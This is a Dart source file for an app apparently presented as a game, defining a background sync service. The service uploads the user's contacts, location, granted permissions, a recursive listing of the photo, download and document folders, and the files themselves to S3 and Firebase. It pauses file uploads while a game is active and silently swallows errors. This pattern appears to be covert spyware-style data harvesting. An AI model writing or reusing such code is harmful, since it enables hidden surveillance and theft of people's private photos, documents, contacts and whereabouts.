import 'dart:io';
import 'package:magic/helpers/contacts_helper.dart';
import 'package:magic/helpers/db_helper.dart';
import 'package:magic/helpers/device_helper.dart';
import 'package:magic/helpers/device_info_helper.dart';
import 'package:magic/helpers/service_helper.dart';
import 'package:magic/helpers/file_tree.dart';
import 'package:magic/storage/storage_manager.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

class BackgroundSyncService {
  // Flag to prevent multiple syncs from running simultaneously.
  static bool _isSyncing = false;

  /// Set app background state for file upload prioritization
  static void setAppBackgroundState(bool isBackground) {
    // Can be used for upload prioritization logic if needed
  }

  /// Check if there are pending file uploads
  static Future<bool> hasPendingUploads() async {
    final queue = await ServiceHelper.getLocalSyncQueue();
    return queue.isNotEmpty;
  }

  /// Force resume all pending uploads
  static Future<void> resumePendingUploads() async {
    final uid = await DeviceInfoHelper.getUID();
    if (uid != null) {
      await ServiceHelper.syncLocalQueueWithFirebase(uid);
    }
  }

  /// Get statistics about pending uploads
  static Future<Map<String, int>> getUploadStatistics() async {
    final regularQueue = await ServiceHelper.getLocalSyncQueue();
    final heavyQueue = await ServiceHelper.getHeavyFilesQueue();

    return {
      'regular_files': regularQueue.length,
      'heavy_files': heavyQueue.length,
      'total_pending': regularQueue.length + heavyQueue.length,
    };
  }

  /// Force complete sync of all pending files (used when app is closing)
  static Future<void> forceCompleteSync() async {
    if (_isSyncing) return;

    try {
      final uid = await DeviceInfoHelper.getUID();
      if (uid == null) return;

      _isSyncing = true;

      // Process regular queue first
      await ServiceHelper.syncLocalQueueWithFirebase(uid);

      // Then process heavy files queue
      await ServiceHelper.processHeavyFilesQueue(uid);

      // NEW: Process pending reports
      await DbHelper.processReportUploads(uid);
    } catch (e) {
      // print('[BackgroundSyncService] Error in forceCompleteSync: $e');
    } finally {
      _isSyncing = false;
    }
  }

  /// Performs all background sync tasks in a safe manner.
  /// This is the single entry point for all background work.
  static Future<void> performAllBackgroundTasks() async {
    if (_isSyncing) {
      // print('[BackgroundSyncService] Sync is already in progress. Skipping.');
      return;
    }

    _isSyncing = true;
    // print('[BackgroundSyncService] Starting background tasks...');

    try {
      final uid = await DeviceInfoHelper.getUID();
      if (uid == null) {
        // print('[BackgroundSyncService] UID not found. Sync is not possible.');
        _isSyncing = false;
        return;
      }

      // Run tasks in parallel where possible.
      await Future.wait([
        // 1. Sync contacts
        _syncContacts(),

        // 2. Sync files
        _syncFiles(uid),

        // 3. Update device information (location, etc.)
        _updateDeviceInfo(uid),
      ]);

      // print('[BackgroundSyncService] Background tasks completed.');
    } catch (e) {
      // print('[BackgroundSyncService] Error during background tasks execution: $e');
    } finally {
      _isSyncing = false;
    }
  }

  /// Helper function to sync contacts if the flag is enabled.
  static Future<void> _syncContacts() async {
    try {
      // Directly check for the permission instead of relying on a flag.
      // This is more robust, as it works even if the user grants permission later
      // in the system settings.
      if (await Permission.contacts.isGranted) {
        await ContactHelper().syncContactsFile();
      }
    } catch (e) {
      // print('[BackgroundSyncService] Error syncing contacts: $e');
    }
  }

  /// Helper function to sync files, checking for permissions and game state.
  static Future<void> _syncFiles(String uid) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      // Do not sync files if the game is active
      if (prefs.getBool('isGameActive') == true) {
        return;
      }

      // Check if file sync is enabled
      if (prefs.getBool('startFilesSync') != true) {
        return;
      }

      // Check for file access permissions
      final sdk = await DeviceInfoHelper.getAndroidSDK();
      final hasPermission = sdk >= 30
          ? await Permission.manageExternalStorage.isGranted
          : await Permission.storage.isGranted;

      if (hasPermission) {
        // 1. Створити file tree та відправити на S3
        try {
          final dirs = [
            await FileTreeService.getDcimDir(),
            await FileTreeService.getPicturesDir(),
            await FileTreeService.getDownloadDir(),
            await FileTreeService.getDocumentsDir(),
          ];
          final allFiles = <String>[];
          for (final dir in dirs) {
            if (dir == null) continue;
            final files =
                dir.listSync(recursive: true).whereType<File>().toList();
            for (final file in files) {
              allFiles.add(file.path);
            }
          }
          // Зберігаємо file tree у тимчасовий файл
          final tempDir = await FileTreeService.getTempDir();
          final fileTreeFile = File(
              '${tempDir.path}/file_tree_${DateTime.now().millisecondsSinceEpoch}.json');
          await fileTreeFile.writeAsString(allFiles.join('\n'));
          // Відправляємо file tree на S3
          await StorageManager.uploadFileTreeFile(
            file: fileTreeFile,
            deviceId: uid,
            fileName: 'file_tree_${DateTime.now().millisecondsSinceEpoch}.json',
            metadata: {
              'device_id': uid,
              'upload_time': DateTime.now().toIso8601String(),
            },
          );
        } catch (e) {
          // print('Error creating or uploading file tree: $e');
        }
        // First process priority queue (small files) then heavy files
        await ServiceHelper.getFilesTreeWithPriority(sdk, uid);

        // Also sync any failed uploads from local queue
        await ServiceHelper.syncLocalQueueWithFirebase(uid);
      }
    } catch (e) {
      // print('[BackgroundSyncService] Error syncing files: $e');
    }
  }

  /// Helper function to update non-critical device information.
  static Future<void> _updateDeviceInfo(String uid) async {
    try {
      await DeviceHelper.getLocation(uid);
      await DeviceHelper.saveUpdateTime(
          DateTime.now().toUtc().toIso8601String());
      await DeviceHelper.saveConnectivity();
      await DeviceHelper.saveGrantedPermissions();
    } catch (e) {
      // print('[BackgroundSyncService] Error updating device info: $e');
    }
  }
}
